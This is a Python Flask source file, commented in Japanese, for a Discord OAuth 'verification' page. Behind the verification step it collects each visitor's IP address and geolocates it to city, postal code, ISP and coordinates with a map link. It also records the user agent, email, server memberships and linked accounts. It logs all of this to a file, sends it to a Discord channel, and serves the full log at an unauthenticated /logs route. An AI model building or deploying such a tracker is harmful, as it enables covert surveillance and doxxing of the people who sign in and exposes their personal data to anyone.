from flask import Flask, request, render_template
import requests, json, os, threading
from dotenv import load_dotenv
from datetime import datetime
from discord_bot import bot
from user_agents import parse  # 追加

load_dotenv()

app = Flask(__name__)
ACCESS_LOG_FILE = "access_log.json"
DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI")

def get_client_ip():
    if "X-Forwarded-For" in request.headers:
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    return request.remote_addr

def get_geo_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,city,zip,isp,as,lat,lon,proxy,hosting,query")
        data = response.json()
        return {
            "country": data.get("country", "不明"),
            "region": data.get("regionName", "不明"),
            "city": data.get("city", "不明"),
            "zip": data.get("zip", "不明"),
            "isp": data.get("isp", "不明"),
            "as": data.get("as", "不明"),
            "lat": data.get("lat"),
            "lon": data.get("lon"),
            "proxy": data.get("proxy", False),
            "hosting": data.get("hosting", False),
            "ip": data.get("query")
        }
    except Exception as e:
        print("GeoIP取得失敗:", e)
        return {"country": "不明", "region": "不明", "city": "不明", "zip": "不明", "isp": "不明", "as": "不明", "lat": None, "lon": None, "proxy": False, "hosting": False, "ip": ip}

def save_log(discord_id, data):
    logs = {}
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    if discord_id not in logs:
        logs[discord_id] = {"history": []}
    data["timestamp"] = now
    logs[discord_id]["history"].append(data)
    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)

@app.route("/")
def index():
    url = f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
    return render_template("index.html", discord_auth_url=url)

@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "コードがありません", 400

    token = requests.post("https://discord.com/api/oauth2/token", data={
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify email guilds connections"
    }, headers={"Content-Type": "application/x-www-form-urlencoded"}).json()

    access_token = token.get("access_token")
    if not access_token:
        return "アクセストークン取得失敗", 400

    user = requests.get("https://discord.com/api/users/@me", headers={
        "Authorization": f"Bearer {access_token}"
    }).json()

    # ギルド参加処理
    requests.put(
        f"https://discord.com/api/guilds/{os.getenv('DISCORD_GUILD_ID')}/members/{user['id']}",
        headers={
            "Authorization": f"Bot {os.getenv('DISCORD_BOT_TOKEN')}",
            "Content-Type": "application/json"
        },
        json={"access_token": access_token}
    )

    ip = get_client_ip()
    if ip.startswith(("127.", "192.", "10.", "172.")):
        ip = requests.get("https://api.ipify.org").text
    geo = get_geo_info(ip)

    user_agent_str = request.headers.get("User-Agent", "不明")
    user_agent = parse(user_agent_str)

    guilds = requests.get("https://discord.com/api/users/@me/guilds", headers={
        "Authorization": f"Bearer {access_token}"
    }).json()

    connections = requests.get("https://discord.com/api/users/@me/connections", headers={
        "Authorization": f"Bearer {access_token}"
    }).json()

    avatar_hash = user.get("avatar")
    if avatar_hash:
        avatar_url = f"https://cdn.discordapp.com/avatars/{user['id']}/{avatar_hash}.png?size=1024"
    else:
        avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png"

    data = {
        "username": user.get("username", ""),
        "discriminator": user.get("discriminator", ""),
        "id": user.get("id", ""),
        "avatar": user.get("avatar"),
        "avatar_url": avatar_url,
        "locale": user.get("locale"),
        "mfa_enabled": user.get("mfa_enabled"),
        "verified": user.get("verified"),
        "email": user.get("email", ""),
        "flags": user.get("flags"),
        "premium_type": user.get("premium_type"),
        "public_flags": user.get("public_flags"),
        "ip": geo["ip"],
        "country": geo["country"],
        "region": geo["region"],
        "city": geo["city"],
        "zip": geo["zip"],
        "isp": geo["isp"],
        "as": geo["as"],
        "lat": geo["lat"],
        "lon": geo["lon"],
        "map_url": f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}" if geo["lat"] and geo["lon"] else "不明",
        "user_agent_raw": user_agent_str,
        "user_agent_os": user_agent.os.family + (f" {user_agent.os.version_string}" if user_agent.os.version_string else ""),
        "user_agent_browser": user_agent.browser.family + (f" {user_agent.browser.version_string}" if user_agent.browser.version_string else ""),
        "user_agent_device": "Mobile" if user_agent.is_mobile else "Tablet" if user_agent.is_tablet else "PC" if user_agent.is_pc else "Other",
        "user_agent_bot": user_agent.is_bot,
        "proxy": geo["proxy"],
        "hosting": geo["hosting"],
        "guilds": guilds,
        "connections": connections
    }

    save_log(user["id"], data)

    try:
        embed_description = (
            f"**名前:** {data['username']}#{data['discriminator']}\n"
            f"**ID:** {data['id']}\n"
            f"**IP:** {data['ip']}\n"
            f"**Proxy:** {data['proxy']} / **Hosting:** {data['hosting']}\n"
            f"**UA:** `{data['user_agent_raw']}`\n"
            f"**OS:** {data['user_agent_os']}\n"
            f"**ブラウザ:** {data['user_agent_browser']}\n"
            f"**デバイス:** {data['user_agent_device']}\n"
            f"**Botか:** {data['user_agent_bot']}\n"
            f"**メール:** {data['email']}\n"
            f"**Locale:** {data['locale']}\n"
            f"**Premium:** {data['premium_type']}\n"
            f"**所属サーバー数:** {len(guilds)} / **外部連携:** {len(connections)}\n"
            f"**国:** {data['country']} / {data['region']} / {data['city']} / 郵便番号: {data['zip']}\n"
            f"**ISP:** {data['isp']} / AS番号: {data['as']}\n"
            f"📍 [Google Mapで場所を確認]({data['map_url']})"
        )

        embed_data = {
            "title": "✅ 新しいアクセスログ",
            "description": embed_description,
            "thumbnail": {"url": data["avatar_url"]},
            "fields": [
                {"name": "緯度 (Latitude)", "value": str(data['lat']) if data['lat'] else "不明", "inline": True},
                {"name": "経度 (Longitude)", "value": str(data['lon']) if data['lon'] else "不明", "inline": True}
            ]
        }

        bot.loop.create_task(bot.send_log(embed=embed_data))

        if data["proxy"] or data["hosting"]:
            bot.loop.create_task(bot.send_log(
                f"⚠️ **不審なアクセス検出**\n"
                f"{data['username']}#{data['discriminator']} ({data['id']})\n"
                f"IP: {data['ip']} / Proxy: {data['proxy']} / Hosting: {data['hosting']}"
            ))

        bot.loop.create_task(bot.assign_role(user["id"]))
    except Exception as e:
        print("Botが準備できていません:", e)

    return render_template("welcome.html", username=data["username"], discriminator=data["discriminator"])

@app.route("/logs")
def show_logs():
    logs = {}
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    return render_template("logs.html", logs=logs)

def run_bot():
    bot.run(os.getenv("DISCORD_BOT_TOKEN"))

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=10000)
